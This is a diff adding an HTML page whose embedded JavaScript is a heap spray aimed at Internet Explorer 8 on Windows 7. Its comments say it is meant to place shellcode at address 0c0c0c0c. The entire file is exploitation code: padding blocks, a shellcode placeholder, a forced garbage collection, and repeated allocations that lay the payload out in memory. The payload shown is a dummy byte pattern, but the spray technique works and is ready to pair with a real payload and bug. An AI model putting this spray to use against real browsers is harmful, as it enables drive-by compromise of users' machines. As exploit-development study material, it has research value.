@@ -1,0 +1,31 @@
+<html>
+<script>
+
+//test spray for IE 8 on Win7
+//successfully overwrite 0c0c0c0c with shellcode
+//mem usage appx 210Mb
+
+padding = unescape('%u4141%u4141');
+blocksize = 0xfffe0
+block = ''
+shellcode = unescape('%u3452%u5031%u3134%u3452%u5031%u3134%u3452%u5031%u3134%u3452%u5031%u3134%u3452%u5031%u3134%u3452%u5031%u3134%u3452%u5031%u3134%u3452%u5031%u3134');
+while (padding.length +shellcode.length < 0x1000/2)
+    padding = padding + unescape('%u4141%u4141');
+document.write('padding length = '+padding.length/2);
+document.write('<br>shellcode length = '+shellcode.length/2);
+ 
+while(block.length<blocksize)
+	block = block + padding.substr(0,0xbe8/2) + shellcode + padding.substr(0,0x1000/2-0xbe8/2-shellcode.length);
+
+padding = '';
+CollectGarbage();
+document.write('<br>block length'+block.length/2);
+var newf = new Array();
+for(var i=0;i<200;i++)
+{
+	newf[i]=block.substr(0,(blocksize-6)/2);
+}
+document.write('<br>done!');
+
+</script>
+</html>
